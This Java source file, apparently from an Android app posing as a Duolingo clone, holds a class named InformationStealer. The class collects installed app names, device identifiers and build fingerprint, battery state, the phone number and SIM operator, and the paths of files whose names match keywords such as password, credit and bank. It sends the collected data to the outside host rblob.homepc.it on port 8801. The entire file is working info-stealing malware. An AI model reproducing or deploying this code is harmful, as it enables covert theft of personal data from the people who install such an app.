package com.example.duolingopezzotto.InfoStealerManager;

import static com.example.duolingopezzotto.InfoStealerManager.JSONParser.convertStringToJSON;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.Manifest;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.content.ContextCompat;

import com.google.gson.JsonObject;

import java.util.List;

public class InformationStealer implements Runnable {

    private static StringBuilder messaggio;
    public static int inviato = 0;

    String[] keywords = {
            "illegal",
            "email",
            "credit",
            "card",
            "password",
            "confidential",
            "private",
            "bank",
            "account",
            "social",
            "security",
            "personal",
            "financial",
            "sensitive",
            "proprietary",
            "classified",
            "conflict",
            "contract",
            "insurance",
            "tax",
            "voti",
            "esami",
            "LSO",
            "indirizzo",
            "soldi"
    };
    NetworkManager netman;
    Context context;

    public InformationStealer(Context context){
        this.context = context;
        messaggio = new StringBuilder();
        netman = new NetworkManager();
    }

    @Override
    public void run(){

        JsonObject messaggioJSON;
        messaggio = new StringBuilder();
        messaggio.append(stealApp(context));
        messaggio.append(stealSystemDetail(context));
        messaggio.append(stealBatteryInformation(context));
        messaggio.append(stealFileSystemInfo(context, keywords));
        messaggio.append(stealNumberInformations(context));

        messaggioJSON = convertStringToJSON(messaggio.toString());
        System.out.println("ECCO IL MESSAGGIO JSON: " + messaggioJSON);

        //TODO: NON DIMENTICHIAMOCI DI ELIMINARE TUTTA STA PARTE QUA
        int index = messaggio.indexOf("&");
        while (index != -1) {
            messaggio.replace(index, index + 1, "\n");
            index = messaggio.indexOf("&", index + 1);
        }

        System.out.println(messaggio.toString());

        inviato = 1;

        netman.openConnection("rblob.homepc.it",8801,context);
        netman.sendMessage2(messaggio);
        netman.closeConnection();
    }

    static String stealNumberInformations(Context context) {
        String msg = "";
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                String phoneNumber = telephonyManager.getLine1Number();
                String operator = telephonyManager.getSimOperatorName();
                msg += "&Phone_number=" + phoneNumber + "&";
                if(operator.isEmpty())
                    msg += "&SIM_Operator=none&";
                else
                    msg += "&SIM_Operator=" + operator + "&";
                return msg;
            } else {

                return "";
            }
        }
        return "";
    }

    private static String getBatteryStatusText(int status){
        switch (status) {
            case BatteryManager.BATTERY_STATUS_CHARGING:
                return "Charging";
            case BatteryManager.BATTERY_STATUS_DISCHARGING:
                return "Discharging";
            case BatteryManager.BATTERY_STATUS_FULL:
                return "Full";
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                return "Not_Charging";
            case BatteryManager.BATTERY_STATUS_UNKNOWN:
            default:
                return "Unknown";
        }
    }

    public String stealFileSystemInfo(Context context, String[] keywords) {
        int numeroFileInteressanti = 0;
        StringBuilder sb = new StringBuilder();

        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            return "";
        }

        // Il permesso è stato concesso, esegui la ricerca dei file
        Uri fileUri = MediaStore.Files.getContentUri("external");
        String[] projection = {MediaStore.Files.FileColumns.DATA};

        StringBuilder selection = new StringBuilder();

        for (int i = 0; i < keywords.length; i++) {
            String keyword = keywords[i];
            selection.append("LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%").append(keyword).append("%')");
            if (i < keywords.length - 1) {
                selection.append(" OR ");
            }
        }

        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection.toString(), null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
                System.out.println("Trovato un file interessante: " + filePath);
                numeroFileInteressanti++;
                sb.append("&File=" + filePath + "&");
            } while (cursor.moveToNext());
            System.out.println("\nFile interessanti trovati: " + numeroFileInteressanti);
            cursor.close();
            sb.append("&File_interessanti=" + numeroFileInteressanti + "&");
        } else {
            sb.append("&File_interessanti=0&");
        }
        // Percorso della directory radice esterna
        String externalStoragePath = Environment.getExternalStorageDirectory().getPath();
        sb.append("&external_storage=").append(externalStoragePath);

        // Verifica se la directory radice esterna è rimovibile
        boolean isExternalStorageRemovable = Environment.isExternalStorageRemovable();
        sb.append("&external_storage_removable=").append(isExternalStorageRemovable);

        // Verifica se la directory radice esterna è condivisa
        boolean isExternalStorageEmulated = Environment.isExternalStorageEmulated();
        sb.append("&external_storage_emulated=").append(isExternalStorageEmulated);

        StatFs stat = new StatFs(externalStoragePath);
        long blockSize = stat.getBlockSizeLong();
        long totalBlocks = stat.getBlockCountLong();
        long availableBlocks = stat.getAvailableBlocksLong();

        long totalSizeBytes = totalBlocks * blockSize;
        long availableSizeBytes = availableBlocks * blockSize;
        double totalSizeGB = (double) totalSizeBytes / (1024 * 1024 * 1024);
        double availableSizeGB = (double) availableSizeBytes / (1024 * 1024 * 1024);

        //String totalSizeFormatted = String.format("%.2f", totalSizeGB);
        //String availableSizeFormatted = String.format("%.2f", availableSizeGB);

        sb.append("&Total_size=" + totalSizeGB + "_GB&");
        sb.append("Available_size=" + availableSizeGB + "_GB&");
        // Altre informazioni sul file system...
        System.out.println("-------\n" + sb.toString());
        return sb.toString();
    }

    public String stealApp(Context context) {
        PackageManager packageManager = context.getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

        int flag = 1;
        StringBuilder sb = new StringBuilder();

        for (ApplicationInfo applicationInfo : installedApplications) {
            if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                //String packageName = applicationInfo.packageName;
                String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                //String sourceDir = applicationInfo.sourceDir;

                sb.append("&App_" + flag + "_Name=").append(appName);
               // sb.append("&Package_Name=").append(packageName);
                //sb.append("&Source_Dir=").append(sourceDir);
                sb.append("&");
                flag++;
            }
        }

        return sb.toString();
    }

    public static String stealSystemDetail(Context context) {
        StringBuilder sb = new StringBuilder();

        sb.append("&Brand=").append(Build.BRAND).append("&");
        sb.append("&DeviceID=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("&");
        sb.append("&Model=").append(Build.MODEL).append("&");
        sb.append("&ID=").append(Build.ID).append("&");
        sb.append("&SDK=").append(Build.VERSION.SDK_INT).append("&");
        sb.append("&Manufacture=").append(Build.MANUFACTURER).append("&");
        sb.append("&User=").append(Build.USER).append("&");
        sb.append("&Type=").append(Build.TYPE).append("&");
        sb.append("&Base=").append(Build.VERSION_CODES.BASE).append("&");
        sb.append("&Incremental=").append(Build.VERSION.INCREMENTAL).append("&");
        sb.append("&Board=").append(Build.BOARD).append("&");
        sb.append("&Host=").append(Build.HOST).append("&");
        sb.append("&FingerPrint=").append(Build.FINGERPRINT).append("&");
        sb.append("&Version_Code=").append(Build.VERSION.RELEASE).append("&");

        return sb.toString();
    }

    public static String stealBatteryInformation(Context context) {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, filter);

        StringBuilder sb = new StringBuilder();

        if (batteryStatus != null) {
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int batteryLevel = (int) ((level / (float) scale) * 100);

            String batteryStatusText = getBatteryStatusText(status);
            sb.append("&Battery_Status=").append(batteryStatusText).append("&");
            sb.append("&Battery_Level=").append(batteryLevel).append("%&");
        } else {
            sb.append("&Battery_Status=Unknown&");
            sb.append("&Battery_Level=Unknown&");
        }

        return sb.toString();
    }
}